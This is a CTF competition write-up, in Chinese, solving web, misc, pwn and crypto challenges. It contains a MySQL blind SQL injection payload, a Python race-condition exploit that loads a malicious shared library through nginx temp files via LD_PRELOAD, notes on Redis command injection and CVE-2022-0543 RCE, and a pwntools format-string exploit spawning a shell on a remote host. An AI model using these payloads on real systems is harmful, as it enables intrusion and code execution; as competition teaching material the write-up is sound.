0x01 WEB
========

babySQL
-------

注入、mysql8、regexp

看hint.md拿到sql。有正则过滤。看代码。没办法直接回显

那就是想办法布尔盲注。或者时间盲注

用case when 和溢出报错构造布尔

语句中间加字符串关键字啥的。就不会报错

case'1'when`password`like`正则`else~1+~1+'1'end='1

就可以跑了。还有大小写问题

<https://dev.mysql.com/doc/refman/8.0/en/string-comparison-functions.htm>l

COLLATE utf8mb4\_bin就行

exp:

用like配合\_。确定长度。一位位跑。然后剩下三个特殊符号再单独跑

用户名也一样

username='||case'1'when`password`like'm52FPlDxYyLB\_eIzAr\_8gxh$'COLLATE`utf8mb4\_bin`then'1'else~1%2B~1%2B'1'end='0&amp;password=123

EZPHP
-----

本以为是P牛星球整的新活，没想到是Hxp的原题。  
nginx上传大文件。会在fd下留缓存文件。而so后面加脏字符。不受影响。可以正常使用  
<https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/>

改改exp就行

nginx id大概在10-20之间。fd爆破

```php

import requests

import threading

import multiprocessing

import threading

import random

SERVER = "http://127.0.0.1/"

# Set the following to True to use the above set of PIDs instead of scanning:

USE_NGINX_PIDS_CACHE = True

def create_requests_session():

    session = requests.Session()

    # Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead

    adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=10000)

    session.mount('http://', adapter)

    return session

def send_payload(requests_session, body_size=1024000):

    try:

        # The file path (/bla) doesn't need to exist - we simply need to upload a large body to Nginx and fail fast

        payload = open("payload.so","rb").read()

        requests_session.post(SERVER + "/index.php", data=(payload + (b"a" * (body_size - len(payload)))))

    except:

        pass

def send_payload_worker(requests_session):

    while True:

        send_payload(requests_session)

def send_payload_multiprocess(requests_session):

    # Use all CPUs to send the payload as request body for Nginx

    for _ in range(multiprocessing.cpu_count()):

        p = multiprocessing.Process(target=send_payload_worker, args=(requests_session,))

        p.start()

def generate_random_path_prefix(nginx_pids):

    # This method creates a path from random amount of ProcFS path components. A generated path will look like /proc/<nginx pid 1>/cwd/proc/<nginx pid 2>/root/proc/<nginx pid 3>/root

    path = ""

    component_num = random.randint(0, 10)

    for _ in range(component_num):

        pid = random.choice(nginx_pids)

        if random.randint(0, 1) == 0:

            path += f"/proc/{pid}/cwd"

        else:

            path += f"/proc/{pid}/root"

    return path

def read_file(requests_session, nginx_pid, fd, nginx_pids):

    nginx_pid_list = list(nginx_pids)

    while True:

        path = generate_random_path_prefix(nginx_pid_list)

        path += f"/proc/{nginx_pid}/fd/{fd}"

        try:

            d = requests_session.get(SERVER + f"/index.php?env=LD_PRELOAD%3D{path}").text

        except:

            continue

        # Flags are formatted as hxp{<flag>}

        if "hxp" in d:

            print("Found flag! ")

            print(d)

def read_file_worker(requests_session, nginx_pid, nginx_pids):

    # Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it's very common for the request body FD to open within this range

    for fd in range(10, 45):

        thread = threading.Thread(target = read_file, args = (requests_session, nginx_pid, fd, nginx_pids))

        thread.start()

def read_file_multiprocess(requests_session, nginx_pids):

    for nginx_pid in nginx_pids:

        p = multiprocessing.Process(target=read_file_worker, args=(requests_session, nginx_pid, nginx_pids))

        p.start()

if __name__ == "__main__":

    requests_session = create_requests_session()

    send_payload_multiprocess(requests_session)

    nginx_pids = set([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15])

    read_file_multiprocess(requests_session, nginx_pids)
```

0x02 MISC
=========

Check in
--------

签到

Plain Text
----------

先base64，然后再一段一段翻译俄文

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-b4ffdd2a681f8fb9183cfa5574f4a63313e13745.png)

就可以得到：

Welcome to motherland, you must translate then into English. Your secret consists of two words. All letters of the fruits. Apple watermelon. We wish you a great day.

注意题目提示： Flag格式 HFCTF{\[a-z\_\]+}，如有空格使用下划线代替

所以字母要全部变成小写，得到flag：

HFCTF{apple\_watermelon}

Quest-Crash
-----------

Burp抓包，可以进行Redis的命令注入，fuzz一下发现没办法写马或者是修改系统配置，ban了SAVE和CONFIG，并且第一行命令还必须是在白名单内，不过可以用换行来注入命令，然后就想到redis存在一个DDoS的漏洞，直接打：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-8235fa299039a1465667a973cfaf18c049b69e85.png)

得到flag：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-ed8991a68ed80033ee05c4979b8b233d8700e2f7.png)

Quest-RCE
---------

近期爆出的Redis Lua沙箱绕过RCE (CVE-2022-0543)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-c16134634fcc6f69ccedda9ba6437c96c15b1ef6.png)

0x03 Pwn
========

babyGame
--------

溢出覆盖seed，伪随机数预测玩游戏，格式化字符串利用栈中的指针把libc\_start\_main\_ret的地址改成进入main函数之前，同时leak libc，第二次fmt写libc\_start\_main\_ret为ogg地址，要爆破栈地址 1/16

```php
from pwn import *
# context.log_level='debug'

# p = process('./babygame')
p = remote('120.25.205.249',26170)
# elf = ELF('./babygame')

p.recvuntil('name:\n')

# gdb.attach(p,"b*0x555555554000+0x1507")

# gdb.attach(p,"b*0x5555555553a1")
p.send('A'*0x100+p32(0x233))

k = [0,2,1,2,0,1,0,0,1,2,2,1,0,2,2,0,0,2,1,0,1,0,1,0,1,1,0,1,0,2,2,0,1,1,0,2,0,1,0,1,0,0,1,1,2,0,2,1,0,1,1,2,2,2,2,0,1,1,1,1,0,2,2,0,1,0,0,2,1,1,1,2,1,2,0,1,0,0,2,0,2,0,2,1,1,0,0,0,1,1,2,2,0,1,0,2,1,1,1,0]

for i in range(0,100):
    p.recvuntil(": \n")
    if k[i]==0:
        p.sendline('1')
    elif k[i]==1:
        p.sendline('2')
    else:
        p.sendline('0')

# gdb.attach(p,"b printf")

p.recvuntil(' you.\n')

payload = "%21$hhn"
payload += 'AAAAAAAAAAAA--%27$p--'
payload = payload.ljust(119,'A')+'a\xa8'
p.send(payload)

# libc = elf.libc
libc = ELF('./libc-2.31.so')
p.recvuntil('--')
read_addr = int(p.recvuntil('--',drop=True),16)-20
libc_base = read_addr - libc.sym['atoi']
print hex(libc_base)

p.recvuntil('AAAAa')
stack = u64(p.recv(6).ljust(8,'\x00'))
print "stack:",hex(stack)

# 0xe6c7e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe6c81 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe6c84 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0x7ffff7eaac7e ogg
# 0x7ffff7deb0b3 libc_start_main

p.recvuntil('name:\n')

# # gdb.attach(p,"b*0x555555554000+0x1507")

# # gdb.attach(p,"b*0x5555555553a1")
p.send('A'*0x100+p32(0x233))

k = [0,2,1,2,0,1,0,0,1,2,2,1,0,2,2,0,0,2,1,0,1,0,1,0,1,1,0,1,0,2,2,0,1,1,0,2,0,1,0,1,0,0,1,1,2,0,2,1,0,1,1,2,2,2,2,0,1,1,1,1,0,2,2,0,1,0,0,2,1,1,1,2,1,2,0,1,0,0,2,0,2,0,2,1,1,0,0,0,1,1,2,2,0,1,0,2,1,1,1,0]

for i in range(0,100):
    p.recvuntil(": \n")
    if k[i]==0:
        p.sendline('1')
    elif k[i]==1:
        p.sendline('2')
    else:
        p.sendline('0')

# gdb.attach(p,"b printf")

ogg = (libc_base+0xe3b31)&0xffffff
print hex(ogg)

p.recvuntil(' you.\n')
n1 = (ogg&0xff)
print n1
n2 = ((ogg>>8)&0xff)
print n2
n3 = ((ogg>>16)&0xff)
print n3

payload = "%"+str(n1)+"c%12$hhn"

payload += "%"+str(n2+256-n1)+"c%13$hhn"
payload += "%"+str(n3+256-n2)+"c%14$hhn"

payload = payload.ljust(48,'\x00')
payload += p64(stack)+p64(stack+1)+p64(stack+2)

# gdb.attach(p,"b*printf")
# payload = "%14$p"
print payload
p.send(payload)

p.interactive()

```

0x04 Crypto
===========

RRSSAA
------

根据序列推出相关关系，反推出V，逆元求出明文

```php
from Crypto.Util.number import *
import gmpy2
nbits = 1024
delta = 0.63
def factor(n,beta):
    something = 2 ** int(nbits * beta)
    for delta in range(114514):
        tmp = gmpy2.iroot(4*n+(something + delta)**2 ,2)
        if tmp[1]:
            p = (tmp[0] - something - delta)//2
            return p

n1 = 122774778628333786198247673730199699244621671207929503475974934116435291656353398717362903500544713183492877018211738292001516168567879903073296829793548881467270228989482723510323780292947403861546283099122868428902480999485625751961457245487615479377459707992802193391975415447673215862245349068018710525679
beta = 0.33
p1 = (factor(n1,beta))
q1 = n1//p1
n = 59969098213446598961510550233718258878862148298191323654672950330070587404726715299685997489142290693126366408044603303463518341243526241117556011994804902686998166238333549719269703453450958140262475942580009981324936992976252832887660977703209225426388975233018602730303262439218292062822981478737257836581
beta = 0.44
p = int(factor(n,beta))
q = n // p
from sage.all import *
def seq(r , k , n):
    init_v = vector(Zmod(n) , [r , 2])
    M = Matrix(Zmod(n) , [
        [r , -1],
        [1 , 0 ]
    ])
    ret = (M**k * init_v)[1]
    return ret
def decrypt(c,e,d,n):
    r = seq(c % n , d , n)
    v = seq(r , e ,n**2)
    c = int((c * inverse(int(v) , n**2) - 1)%(n*n)) //n
    return long_to_bytes(c)
e1 = 7105408692393780974425936359246908629062633111464343215149184058052422839553782885999575538955213539904607968494147112651103116202742324255190616790664935322773999797774246994193641076154786429287567308416036562198486649223818741008968261111017589015617705905631979526370180766874051731174064076871339400470062519500450745667838729104568633808272577378699913068193645578675484681151593983853443489561431176000585296710615726640355782811266099023653898050647891425956485791437516020367967793814415345332943552405865306305448753989707540163585481006631816856260061985275944250758886027672221219132999488907097750048011
c1 = 2593129589804979134490367446026701647048897831627696427897506570257238733858989741279626614121210703780002736667183915826429635213867589464112850355422817678245007337553349507744893376944140333333044928907283949731124795240808354521353751152149301719465724014407412256933045835977081658410026081895650068864922666975525001601181989114436054060461228877148361720945120260382962899756912493868467226822547185396096960560068874538680230073168773182775945272726468512949751672553541335307512429217493003429882831235199830121519272447634533018024087697385363918421438799206577619692685090186486444886371979602617584956259
n1 = 122774778628333786198247673730199699244621671207929503475974934116435291656353398717362903500544713183492877018211738292001516168567879903073296829793548881467270228989482723510323780292947403861546283099122868428902480999485625751961457245487615479377459707992802193391975415447673215862245349068018710525679
d1 = int(inverse(e1,(p1**2-1)*(q1**2-1)))
print(((decrypt(c1,e1,d1,n1))))
e = 970698965238639683403205181589498135440069660016843488485401994654202837058754446853559143754852628922125327583411039117445415303888796067576548626904070971514824878024057391507617988385537930417136322298476467215300995795105008488692961624917433064070351961856959734368784774555385603000155569897078026670993484466622344106374637350023474339105113172687604783395923403613555236693496567851779400707953027457705617050061193750124237055690801725151098972239120476113241310088089420901051617493693842562637896252448161948655455277146925913049354086353328749354876619287042077221173795354616472050669799421983520421287
c = 2757297249371055260112176788534868300821961060153993508569437878576838431569949051806118959108641317578931985550844206475198216543139472405873345269094341570473142756599117266569746703013099627523306340748466413993624965897996985230542275127290795414763432332819334757831671028121489964563214463689614865416498886490980692515184662350519034273510244222407505570929178897273048405431658365659592815446583970229985655015539079874797518564867199632672678818617933927005198847206019475149998468493858071672920824599672525667187482558622701227716212254925837398813278836428805193481064316937182435285668656233017810444672
n = 59969098213446598961510550233718258878862148298191323654672950330070587404726715299685997489142290693126366408044603303463518341243526241117556011994804902686998166238333549719269703453450958140262475942580009981324936992976252832887660977703209225426388975233018602730303262439218292062822981478737257836581
d = int(inverse(e,(p**2-1)*(q**2-1)))
print(decrypt(c,e,d,n))

```